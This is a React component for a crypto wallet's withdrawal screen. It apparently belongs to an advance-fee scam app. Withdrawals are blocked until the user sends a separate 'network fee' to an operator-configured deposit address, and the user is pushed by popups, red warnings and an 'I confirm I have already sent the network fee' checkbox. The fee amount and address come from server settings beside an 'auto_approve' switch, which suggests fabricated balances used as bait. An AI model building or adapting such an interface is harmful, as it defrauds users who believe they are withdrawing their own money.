import React, { useEffect, useId, useState } from 'react';
import { ArrowLeft, AlertCircle, Copy, X } from 'lucide-react';
import { ViewState } from '../App';
import { AssetType } from '../store';
import { api, WalletData, SettingsData } from '../api';
import { saveTxToStorage, loadTxFromStorage } from '../txStorage';
import { toast } from 'sonner';

interface SendWithdrawViewProps {
  asset: AssetType;
  onNavigate: (view: ViewState, asset?: AssetType) => void;
}

interface FeePopupProps {
  feeInAsset: number;
  assetLabel: string;
  feeAddress: string;
  feeUsd: number;
  onClose: () => void;
}

function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, onClose }: FeePopupProps) {
  const handleCopy = () => {
    navigator.clipboard.writeText(feeAddress)
      .then(() => toast.success('Deposit address copied'))
      .catch(() => toast.error('Failed to copy'));
  };
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-5">
      <div className="w-full max-w-[390px] bg-card border border-destructive/30 rounded-3xl p-6 flex flex-col gap-5 shadow-2xl">
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-destructive/15 flex items-center justify-center shrink-0">
              <AlertCircle className="w-5 h-5 text-destructive" />
            </div>
            <h2 className="text-base font-bold text-foreground">Network Fee Required</h2>
          </div>
          <button onClick={onClose} className="p-1 text-muted hover:text-foreground transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        <p className="text-sm text-muted leading-relaxed">
          Before your withdrawal can be processed, you must clear the network fee below. Send the exact amount to the address provided.
        </p>

        <div className="bg-destructive/10 border border-destructive/20 rounded-2xl p-4 flex flex-col gap-3">
          <div className="flex flex-col gap-1">
            <span className="text-xs text-muted uppercase tracking-widest font-medium">Amount Due</span>
            <span className="text-2xl font-bold text-destructive">
              {feeInAsset} {assetLabel}
              <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
            </span>
          </div>
          <div className="flex flex-col gap-1">
            <span className="text-xs text-muted uppercase tracking-widest font-medium">Send Fee To</span>
            <button
              onClick={handleCopy}
              className="flex items-center gap-2 bg-background/60 border border-border/60 rounded-xl px-3 py-2.5 text-left hover:bg-background transition-colors"
            >
              <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeAddress}</span>
              <Copy className="w-4 h-4 text-muted shrink-0" />
            </button>
          </div>
        </div>

        <button
          onClick={onClose}
          className="w-full bg-destructive hover:bg-destructive/90 text-white font-semibold rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
        >
          Got it — I'll pay the fee
        </button>
      </div>
    </div>
  );
}

export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
  const checkboxId = useId();
  const [wallet, setWallet] = useState<WalletData | null>(null);
  const [settings, setSettings] = useState<SettingsData | null>(null);
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [error, setError] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);
  const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
  const [showFeePopup, setShowFeePopup] = useState(false);

  useEffect(() => {
    Promise.all([api.getWallet(), api.getSettings()])
      .then(([w, s]) => { setWallet(w); setSettings(s); })
      .catch(() => toast.error('Failed to load wallet data'))
      .finally(() => setLoading(false));
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      api.getSettings().then(s => setSettings(s)).catch(() => {});
    }, 15_000);
    return () => clearInterval(interval);
  }, []);

  if (loading || !wallet || !settings) {
    return (
      <div className="flex flex-col h-full items-center justify-center bg-background">
        <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  const maxAmount = wallet[asset];

  const prices: Record<AssetType, number> = {
    btc: settings.btc_price,
    eth: settings.eth_price,
    usdt_trc20: settings.usdt_price,
    usdt_bep20: settings.usdt_price,
    usdt_erc20: settings.usdt_price,
    trx: settings.trx_price,
  };

  const feeDepositAddress: string | null | undefined =
    settings[`deposit_address_${asset}` as keyof SettingsData] as string | null | undefined;

  const isUsdt = asset === 'usdt_trc20' || asset === 'usdt_bep20' || asset === 'usdt_erc20';

  // Use per-coin withdrawal fee if set (> 0), else fall back to global gas fee
  const perCoinFeeKey = `withdrawal_fee_${asset}` as keyof SettingsData;
  const perCoinFeeUsd = (settings[perCoinFeeKey] as number | undefined) ?? 0;
  const feeUsd = perCoinFeeUsd > 0 ? perCoinFeeUsd : settings.gas_fee_usd;

  const feeInAsset: number = isUsdt
    ? parseFloat(feeUsd.toFixed(4))
    : parseFloat((feeUsd / prices[asset]).toFixed(8));

  const assetLabel = (() => {
    switch (asset) {
      case 'usdt_trc20': return 'USDT (TRC20)';
      case 'usdt_bep20': return 'USDT (BEP20)';
      case 'usdt_erc20': return 'USDT (ERC20)';
      default: return asset.toUpperCase();
    }
  })();

  const showGasFeeSection = !settings.auto_approve && !!feeDepositAddress;

  const getAssetName = () => {
    switch (asset) {
      case 'btc': return 'Bitcoin (BTC)';
      case 'eth': return 'Ethereum (ETH)';
      case 'usdt_trc20': return 'Tether USDT (TRC20)';
      case 'usdt_bep20': return 'Tether USDT (BEP20)';
      case 'usdt_erc20': return 'Tether USDT (ERC20)';
      case 'trx': return 'Tron (TRX)';
    }
  };

  const copyFeeAddress = () => {
    if (!feeDepositAddress) return;
    navigator.clipboard.writeText(feeDepositAddress)
      .then(() => toast.success('Deposit address copied'))
      .catch(() => toast.error('Failed to copy'));
  };

  const handleSend = async () => {
    setError('');

    if (!address.trim()) { setError('Please enter a recipient address'); return; }
    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) { setError('Please enter a valid amount'); return; }
    if (withdrawAmount > maxAmount) { setError(`Insufficient ${assetLabel} balance`); return; }

    // Show popup if fee section is visible and not acknowledged
    if (showGasFeeSection && !gasFeeAcknowledged) {
      setShowFeePopup(true);
      return;
    }

    setSubmitting(true);
    try {
      await api.sendWithdraw(asset, withdrawAmount, address.trim());

      const txs = await api.getTransactions().catch(() => []);
      const local = loadTxFromStorage();
      const merged = txs.length >= local.length ? txs : local;
      saveTxToStorage(merged);

      toast.success('Withdrawal processed successfully', {
        description: `Sent ${withdrawAmount} ${assetLabel}`,
      });
      onNavigate('asset-details', asset);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Transaction failed';
      setError(msg);
    } finally {
      setSubmitting(false);
    }
  };

  const withdrawAmount = parseFloat(amount);
  const showGasFeeWarning = showGasFeeSection && gasFeeAcknowledged && !isNaN(withdrawAmount) && withdrawAmount > 0;

  return (
    <>
      <div className="flex flex-col h-full bg-background">
        {/* Header */}
        <div className="flex items-center p-6 pt-8 relative">
          <button
            onClick={() => onNavigate('asset-details', asset)}
            className="p-2 -ml-2 text-muted hover:text-foreground transition-colors absolute left-6"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="font-medium text-foreground w-full text-center">Send Crypto</div>
        </div>

        <div className="flex flex-col flex-1 px-6 py-4 gap-6 overflow-y-auto">
          {/* Asset */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-muted px-1">Asset</label>
            <div className="w-full bg-card/50 border border-border rounded-xl px-4 py-3.5 text-foreground opacity-70 cursor-not-allowed">
              {getAssetName()}
            </div>
          </div>

          {/* Recipient */}
          <div className="flex flex-col gap-2">
            <label className="text-sm text-muted px-1">Recipient Address</label>
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm"
              placeholder="Paste wallet address"
            />
          </div>

          {/* Amount */}
          <div className="flex flex-col gap-2">
            <div className="flex justify-between items-center px-1">
              <label className="text-sm text-muted">Amount</label>
              <span
                className="text-xs text-primary font-medium cursor-pointer"
                onClick={() => setAmount(maxAmount.toString())}
              >
                Max
              </span>
            </div>
            <div className="relative">
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors text-lg"
                placeholder="0.00"
                step="any"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-muted font-medium text-sm">
                {assetLabel}
              </div>
            </div>
            <div className="text-xs text-muted px-1 flex justify-between">
              <span>Available: {maxAmount > 0 ? maxAmount.toLocaleString(undefined, { maximumFractionDigits: 8 }) : '0'} {assetLabel}</span>
              <span>~${(parseFloat(amount || '0') * prices[asset]).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
            </div>
          </div>

          {/* Network Fee section */}
          {showGasFeeSection && (
            <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
              <div className="flex gap-3">
                <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
                <div className="flex flex-col gap-1">
                  <div className="text-sm font-semibold text-foreground">Network Fee Required</div>
                  <div className="text-xl font-bold text-destructive">
                    {feeInAsset} {assetLabel}
                    <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
                  </div>
                  <div className="text-xs text-muted/90 leading-relaxed">
                    Deposit the network fee to the address below before your withdrawal is processed.
                  </div>
                </div>
              </div>

              <div className="flex flex-col gap-2">
                <span className="text-xs text-muted uppercase tracking-widest font-medium">Send fee to this {assetLabel} address</span>
                <button
                  onClick={copyFeeAddress}
                  className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
                >
                  <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeDepositAddress}</span>
                  <Copy className="w-4 h-4 text-muted shrink-0" />
                </button>
              </div>

              <label htmlFor={checkboxId} className="flex items-start gap-3 cursor-pointer select-none">
                <input
                  id={checkboxId}
                  type="checkbox"
                  checked={gasFeeAcknowledged}
                  onChange={(e) => setGasFeeAcknowledged(e.target.checked)}
                  className="mt-0.5 w-4 h-4 accent-primary cursor-pointer shrink-0"
                />
                <span className="text-xs text-muted leading-relaxed">
                  I confirm I have already sent the network fee of{' '}
                  <span className="text-destructive font-semibold">{feeInAsset} {assetLabel}</span>{' '}
                  to the address above and my withdrawal is ready to be processed.
                </span>
              </label>

              {showGasFeeWarning && (
                <div className="rounded-lg bg-destructive/20 border border-destructive/40 px-3 py-2.5 flex gap-2 items-start">
                  <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                  <p className="text-xs text-destructive font-medium leading-relaxed">
                    Kindly cover your gas fee of{' '}
                    <span className="font-bold">{feeInAsset} {assetLabel}</span>{' '}
                    to the address above before confirming your withdrawal.
                  </p>
                </div>
              )}
            </div>
          )}

          {error && (
            <div className="text-destructive text-sm px-1 font-medium text-center">{error}</div>
          )}

          <button
            onClick={handleSend}
            disabled={submitting}
            className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
          >
            {submitting ? 'Processing…' : 'Confirm Withdrawal'}
          </button>
        </div>
      </div>

      {showFeePopup && feeDepositAddress && (
        <FeePopup
          feeInAsset={feeInAsset}
          assetLabel={assetLabel}
          feeAddress={feeDepositAddress}
          feeUsd={feeUsd}
          onClose={() => setShowFeePopup(false)}
        />
      )}
    </>
  );
}
